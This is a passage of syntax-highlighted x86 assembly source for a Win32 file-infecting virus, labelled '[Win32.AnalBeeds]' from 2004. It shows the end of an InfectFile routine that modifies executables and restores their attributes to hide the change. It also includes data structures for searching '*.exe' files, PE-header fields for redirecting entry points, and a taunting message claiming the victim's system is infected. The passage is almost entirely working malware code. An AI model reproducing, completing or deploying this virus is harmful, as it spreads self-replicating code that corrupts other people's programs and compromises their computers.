    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_SetEndOfFile</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; And finaly we close the file                      ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_CloseHandle</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; Then we must restore file attributes              ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fileattributes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fileofs</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_SetFileAttributesA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">InfectionSuccesful</span><span class="sc0">

</span><span class="sc5">InfectionError</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">                             </span><span class="sc1">; CF set if an error occured or file was already infected</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">OutOfhere</span><span class="sc0">

</span><span class="sc5">InfectionSuccesful</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">infectionflag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">InfectionError</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">                             </span><span class="sc1">; If all is ok, CF is reset</span><span class="sc0">

</span><span class="sc5">OutOfhere</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                               </span><span class="sc1">; Restore registers</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">InfectFile</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">


    </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">                        </span><span class="sc1">; Maximum Length Of Filename</span><span class="sc0">

    </span><span class="sc5">FILETIME</span><span class="sc0">          </span><span class="sc9">STRUC</span><span class="sc0">                 </span><span class="sc1">; Filetime Structure</span><span class="sc0">
        </span><span class="sc5">FT_dwLowDateTime</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">FT_dwHighDateTime</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">FILETIME</span><span class="sc0">          </span><span class="sc9">ENDS</span><span class="sc0">

    </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0">       </span><span class="sc9">STRUC</span><span class="sc0">
        </span><span class="sc5">FileAttributes</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">                </span><span class="sc1">; Attributes</span><span class="sc0">
        </span><span class="sc5">CreationTime</span><span class="sc0">      </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                </span><span class="sc1">; time of creation</span><span class="sc0">
        </span><span class="sc5">LastAccessTime</span><span class="sc0">    </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                </span><span class="sc1">; last access time</span><span class="sc0">
        </span><span class="sc5">LastWriteTime</span><span class="sc0">     </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                </span><span class="sc1">; last modificationm</span><span class="sc0">
        </span><span class="sc5">FileSizeHigh</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">                </span><span class="sc1">; filesize</span><span class="sc0">
        </span><span class="sc5">FileSizeLow</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">Reserved0</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">Reserved1</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">FileName</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">         </span><span class="sc1">; long filename</span><span class="sc0">
        </span><span class="sc5">AlternateFileName</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc2">14</span><span class="sc0">   </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">         </span><span class="sc1">; short filename</span><span class="sc0">
    </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0">       </span><span class="sc9">ENDS</span><span class="sc0">

    </span><span class="sc5">search</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                    </span><span class="sc1">; our search area</span><span class="sc0">

    </span><span class="sc5">windir</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">128h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">                       </span><span class="sc1">; Windows directory</span><span class="sc0">
    </span><span class="sc5">sysdir</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">128h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">                       </span><span class="sc1">; System directory</span><span class="sc0">
    </span><span class="sc5">crtdir</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">128h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">                       </span><span class="sc1">; Current directory</span><span class="sc0">

    </span><span class="sc5">exestr</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"*.exe"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc1">;;;;;;;;;;;;;;;;;</span><span class="sc0">
    </span><span class="sc1">;TEMP VARS</span><span class="sc0">
    </span><span class="sc1">;;;;;;;;;;;;;;;;</span><span class="sc0">
    </span><span class="sc5">infections</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">newfilesize</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">infectionflag</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc10">memory</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">fileofs</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">fileattributes</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">filehandle</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ftcreation</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">maphandle</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">mapaddress</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">PEheader</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">oldip</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">filealign</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">oldrawsize</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">newrawsize</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">newip</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">incrawsize</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">start</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">imagebase</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">viruslen</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">VirusEnd</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VirusStart</span><span class="sc4">)</span><span class="sc0">

    </span><span class="sc5">Copyright</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'[Win32.AnalBeeds] (C) 2004 by Sinclaire'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc5">szTitle</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'[Win32.AnalBeeds]'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc5">szText</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Succeeded to infiltarte your computer and'</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'infect your system, all haile to Sinclaire'</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'I Guess you hate me now =)'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Greetz to MENZO, OMARESTEIN, CHE-GUEVARA and others'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


    </span><span class="sc1">; DLL name we are going to import</span><span class="sc0">
    </span><span class="sc5">__DLL_User32</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'User32'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc1">; API's we are going to use</span><span class="sc0">
    </span><span class="sc5">__API_LoadLibraryA</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'LoadLibraryA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc5">__API_MessageBoxA</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'MessageBoxA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">__API_ExitProcess</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ExitProcess'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc5">__API_FindFirstFileA</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FindFirstFileA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">__API_FindNextFileA</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FindNextFileA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">__API_GetFileAttributesA</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetFileAttributesA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">__API_SetFileAttributesA</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SetFileAttributesA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">__API_CreateFileA</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CreateFileA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">__API_GetFileTime</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetFileTime'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">__API_GetFileSize</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetFileSize'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">__API_CreateFileMappingA</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CreateFileMappingA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">__API_MapViewOfFile</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'MapViewOfFile'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">__API_UnmapViewOfFile</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'UnmapViewOfFile'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">__API_CloseHandle</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CloseHandle'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">__API_SetFileTime</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SetFileTime'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">__API_SetFilePointer</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SetFilePointer'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">__API_GetWindowsDirectoryA</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetWindowsDirectoryA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">__API_GetSystemDirectoryA</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetSystemDirectoryA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">__API_GetCurrentDirectoryA</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetCurrentDirectoryA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">__API_SetCurrentDirectoryA</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SetCurrentDirectoryA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">__API_SetEndOfFile</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SetEndOfFile'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


    </span><span class="sc5">__ADDR_MessageBoxA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Address of MessageBoxA</span><span class="sc0">
    </span><span class="sc5">__ADDR_ExitProcess</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Address of ExitProcess</span><span class="sc0">

    </span><span class="sc5">__ADDR_FindFirstFileA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Address of FindFirstFileA</span><span class="sc0">
    </span><span class="sc5">__ADDR_FindNextFileA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Address of FindNextFileA</span><span class="sc0">
    </span><span class="sc5">__ADDR_GetFileAttributesA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Address of GetFileAttributesA</span><span class="sc0">
    </span><span class="sc5">__ADDR_SetFileAttributesA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Address of SetFileAttributesA</span><span class="sc0">
    </span><span class="sc5">__ADDR_CreateFileA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Address of CreateFileA</span><span class="sc0">
    </span><span class="sc5">__ADDR_GetFileTime</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Address of GetFileTime</span><span class="sc0">
    </span><span class="sc5">__ADDR_GetFileSize</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Address of GetFileSize</span><span class="sc0">
    </span><span class="sc5">__ADDR_CreateFileMappingA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Address of CreateFileMappingA</span><span class="sc0">
    </span><span class="sc5">__ADDR_MapViewOfFile</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Address of MapViewOfFile</span><span class="sc0">
    </span><span class="sc5">__ADDR_UnmapViewOfFile</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Address of UnmapViewOfFile</span><span class="sc0">
    </span><span class="sc5">__ADDR_CloseHandle</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Address of CloseHandle</span><span class="sc0">
    </span><span class="sc5">__ADDR_SetFileTime</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Address of SetFileTime</span><span class="sc0">
    </span><span class="sc5">__ADDR_SetFilePointer</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Address of SetFilePointer</span><span class="sc0">
    </span><span class="sc5">__ADDR_GetWindowsDirectoryA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Address of GetWindowsDirectoryA</span><span class="sc0">
    </span><span class="sc5">__ADDR_GetSystemDirectoryA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Address of GetSystemDirectoryA</span><span class="sc0">
    </span><span class="sc5">__ADDR_GetCurrentDirectoryA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Address of GetCurrentDirectoryA</span><span class="sc0">
    </span><span class="sc5">__ADDR_SetCurrentDirectoryA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Address of SetCurrentDirectoryA</span><span class="sc0">
    </span><span class="sc5">__ADDR_SetEndOfFile</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Address of SetEndOfFile</span><span class="sc0">

    </span><span class="sc5">_User32</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Handle to user32</span><span class="sc0">
    </span><span class="sc5">_Kernel32</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Handle to kernel32</span><span class="sc0">

</span><span class="sc5">VirusEnd</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">VirusStart</span></div></body>
</html>
